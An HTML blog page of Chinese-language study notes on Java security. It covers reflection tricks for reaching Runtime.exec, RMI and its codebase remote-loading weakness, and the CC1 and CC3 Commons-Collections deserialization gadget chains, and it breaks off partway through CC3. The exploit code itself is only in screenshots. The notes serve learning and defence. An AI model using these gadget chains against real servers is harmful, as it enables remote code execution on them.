@@ -1,0 +1,1181 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/bz.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="z2zQAQ">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基础反射关键四个点   获取类  getclass：存在实例，获取类 class：传入类，只获取class对象 forname：通过名字获取类 内部类若c1类中编写c2类，则编译的时候会构造出c1$c2.class 同时forClass获取内部类也是用$ 可变长函数在java底层都相当于数组 动态代理语法 ClassLoader 需要代理的对象 实现了InvocationHandler接口的对象（">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全">
+<meta property="og:url" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Welcome to my world">
+<meta property="og:description" content="基础反射关键四个点   获取类  getclass：存在实例，获取类 class：传入类，只获取class对象 forname：通过名字获取类 内部类若c1类中编写c2类，则编译的时候会构造出c1$c2.class 同时forClass获取内部类也是用$ 可变长函数在java底层都相当于数组 动态代理语法 ClassLoader 需要代理的对象 实现了InvocationHandler接口的对象（">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160244640.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160259463.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828171025858.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160331491.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822162510500.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8/image-20240822162938175.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163017563.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163506590.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163912568.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164616752.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164833930.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164847406.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171051720.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171141413.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171345448.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171356276.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822172503581.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901162528221.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173252630.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173907101.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822174134316.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822175023452.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822180338801.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100429772.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100704819.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901172435852.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192620272.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192654165.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828172948549.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828173210827.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200350179.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200402681.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830025106763.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830031951647.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200132535.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200150705.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902161811190.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830024138826.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830032944049.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830033417841.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200450616.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200512394.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200526744.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042046718.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042515646.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830042747118.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830043216267.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200549726.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044440538.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830044346633.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045043595.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830045157340.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830050625387.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051014721.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830051429547.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163221805.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902111240803.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902160629272.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163728961.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163815258.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902163916449.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902164538301.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902162927924.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165315177.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823165651906.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828164332170.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104537565.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104710069.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240531104822161.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601003801739.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004003868.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004054185.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004218051.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601004441277.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240601010107546.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240604182647623.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223536069.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829223921069.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224027506.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224529134.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240829224945197.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830000518794.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240830012440699.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094658896.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094735083.png">
+<meta property="og:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240902094810072.png">
+<meta property="article:published_time" content="2024-12-30T02:02:24.000Z">
+<meta property="article:modified_time" content="2025-01-02T08:38:17.087Z">
+<meta property="article:author" content="z2zQAQ">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160244640.png">
+  
+  
+  
+  <title>java安全 - Welcome to my world</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/z2z_custom/custom.css">
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"__","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>z2zQAQ</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/moon.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="java安全"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-30 10:02" pubdate>
+          2024年12月30日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          80 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">java安全</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>反射关键四个点</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160244640.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822160244640">
+
+<h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160259463.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822160259463">
+
+<p>getclass：存在实例，获取类</p>
+<p>class：传入类，只获取class对象</p>
+<p>forname：通过名字获取类</p>
+<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>若c1类中编写c2类，则编译的时候会构造出c1$c2.class</p>
+<p>同时forClass获取内部类也是用$</p>
+<h2 id="可变长函数"><a href="#可变长函数" class="headerlink" title="可变长函数"></a>可变长函数</h2><p>在java底层都相当于数组</p>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
+<li>ClassLoader</li>
+<li>需要代理的对象</li>
+<li>实现了InvocationHandler接口的对象（实现）</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828171025858.png" srcset="/img/loading.gif" lazyload class="" title="image-20240828171025858">
+
+
+
+
+
+<h1 id="反射函数"><a href="#反射函数" class="headerlink" title="反射函数"></a>反射函数</h1><h2 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822160331491.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822160331491">
+
+<p>当forName函数第二个参数为ture的时候，会进行<strong>类初始化</strong></p>
+<p>如下代码先执行static 最后执行构造函数</p>
+<p><strong>static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯，但在当前构造函数内容的前⾯</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822162510500.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822162510500">
+
+<p>那么，若有函数</p>
+<img src="java安全/image-20240822162938175.png" srcset="/img/loading.gif" lazyload alt="image-20240822162938175" style="zoom:150%;" />
+
+<p>则可以已通过构造一个恶意类，使它的static函数被虚拟机类初始化时能够getshell</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163017563.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822163017563">
+
+
+
+<h2 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h2><p>调用<strong>无参构造</strong>，或者在<strong>构造器上面调用构造函数</strong></p>
+<ul>
+<li><p>无参构造函数</p>
+</li>
+<li><p>方法不能私有</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163506590.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822163506590"></li>
+</ul>
+<p>如上 Runtime类构造函数私有，报错</p>
+<p>（单例模式：对于Web应用来说，数据库连接只需要建立一次，开发者可以将数据库连接使用的类的构造函数设置为私有，然后编写一个<strong>静态方法</strong>来获取）</p>
+<p>则换成Runtime.getRuntime()获取对象</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822163912568.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822163912568">
+
+
+
+<h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p><strong>获取类的公有方法</strong>，由于java支持<strong>重载</strong>，则需要传入两个参数</p>
+<ul>
+<li>函数名</li>
+<li>参数列表</li>
+</ul>
+<p>例如<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164616752.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822164616752"></p>
+<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p>执行方法 ，第一个参数</p>
+<ul>
+<li>普通方法，传入对象</li>
+<li>静态方法，传入类</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164833930.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822164833930">
+
+<p>第二个参数是传入方法的参数</p>
+<p>综上所述，</p>
+<p>获取类，获取方法</p>
+<p>利用获取的<strong>静态方法</strong>传入类调用构造函数，<strong>得到对象</strong>，然后invoke调用方法</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822164847406.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822164847406">
+
+
+
+<h2 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor"></a>getConstructor</h2><p><strong>没有无参构造，也没静态调用构造</strong></p>
+<p>接受构造函数列表类型，返回引用了该构造函数的<code>java.lang.reflect.Constructor</code> 对象，然后用newinstance将他实例化</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171051720.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822171051720">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171141413.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822171141413">
+
+<p>想调用ProcessBuilder第二个构造函数的时候由于是<strong>变长参数</strong>，又因为newInstance函数本身接收的是一个可变长参数，则传入一个二维数组</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171345448.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822171345448">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822171356276.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="getDeclared"><a href="#getDeclared" class="headerlink" title="getDeclared"></a>getDeclared</h2><ul>
+<li>私有方法调用</li>
+<li>不继承父类</li>
+<li>需要setAccessible（ture）</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822172503581.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822172503581">
+
+
+
+<h2 id="getRuntime"><a href="#getRuntime" class="headerlink" title="getRuntime"></a>getRuntime</h2><p>Runtime类中的<strong>静态方法</strong>，可以省略实例化的过程，invoke直接放入一个类即可，如果不使用它则需要通过getConstructor来实例化对象</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>由于Runtime类不可直接序列化，所以通过Class类以及强转得到</p>
+<p>首先获取class原型对象（可序列化）</p>
+<p>然后通过getMethod获取了getRuntime和exec方法</p>
+<p>通过invoke调用getRuntime方法来获取runtime对象，然后同样调用exec方法</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901162528221.png" srcset="/img/loading.gif" lazyload class="" title="image-20240901162528221">
+
+<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173252630.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822173252630">
+
+<p>如下</p>
+<ul>
+<li>继承Remote并且定义函数的接口</li>
+<li>实现此接口的类</li>
+<li>实例化上面的类后绑定，创建Registry</li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822173907101.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822173907101">
+
+<p>LocateRegistry.createRegistry(1099);创建了Registry</p>
+<p>Naming.bind绑定到将一个对象和一个名字（hello）绑定在一起</p>
+<p>客户端</p>
+<p>利用接口，Naming.loockup查找并且创建对象</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822174134316.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822174134316">
+
+<blockquote>
+<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name</p>
+<p>到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI</p>
+<p>Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
+</blockquote>
+<p>tcp连接两次，第一次根据绑定的ip查询Registry，第二次接受序列化数据，反序列化后得到目标ip和端口</p>
+<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>Naming下的list和lookup方法</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822175023452.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822175023452">
+
+
+
+<p>此处还存在一个codebase漏洞，反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240822180338801.png" srcset="/img/loading.gif" lazyload class="" title="image-20240822180338801">
+
+<h1 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h1><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">调用AnnotationInvocationHandler#invoke去调用lazymap#get最后到达transform方法<br></code></pre></td></tr></table></figure>
+
+<p><strong>在Java 8u71以后的版本AnnotationInvocationHandler新建了一个LinkedHashMap对象，并将原来的键值添加进去，导致CC1 CC3不可用</strong></p>
+<ul>
+<li><p>Runtime是内置类，需要获取.class后getMethod获取getRuntime方法</p>
+</li>
+<li><p>TransformedMap用来修饰一个map，map被修改键值的时候会回调，所以构造outputMap，被修改键值的时候触发ChainsfromedMap</p>
+</li>
+<li><p>AnnotationInvocationHandler类构造方法私有，需要反射获取，它的价值是修改map的键值，代替了demo中的put</p>
+</li>
+<li><p>关于AnnotationInvocationHandler类的构造<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100429772.png" srcset="/img/loading.gif" lazyload class="" title="image-20240823100429772"></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240823100704819.png" srcset="/img/loading.gif" lazyload class="" title="image-20240823100704819">
+
+
+
+<p>所以构造的时候传入了Rentention类，这个类有一个value方法，所以给innerMap传入一个value键</p>
+</li>
+<li><p>lazymap：链子中代替了transformMap，他的<strong>get方法找不到参数的时候会调用transfrom</strong>，很巧的是可以利用动态代理调用<strong>AnnotationInvocationHandler#invoke去调用lazymap#get</strong></p>
+</li>
+<li><p>AnnotationInvocationHandler#readObject中的value被设置，但是可以用<strong>constanTransformer来绕过，强制返回一个Runtime.class</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240901172435852.png" srcset="/img/loading.gif" lazyload class="" title="image-20240901172435852"></li>
+</ul>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192620272.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904192620272">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240904192654165.png" srcset="/img/loading.gif" lazyload class="" title="image-20240904192654165">
+
+<p>AnnotationInvocationHandler#readObject–&gt;lazymap#get–&gt;transfrom</p>
+<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">通过InstantiateTransformer调用TrAXFilter的构造方法最后调用templates.<span class="hljs-keyword">new</span><span class="hljs-type">Transformer</span>（）来动态加载字节码<br></code></pre></td></tr></table></figure>
+
+<p>同cc1，限制于8u71</p>
+<p><strong>绕过了InvokerTransformer</strong></p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828172948549.png" srcset="/img/loading.gif" lazyload class="" title="image-20240828172948549">
+
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240828173210827.png" srcset="/img/loading.gif" lazyload class="" title="image-20240828173210827">
+
+<p>注意！下图的transformers未修改</p>
+<img src="/2024/12/30/java%E5%AE%89%E5%85%A8/image-20240831200350179.png" srcset="/img/loading.gif" lazyload class="" title="image-20240831200350179">
+
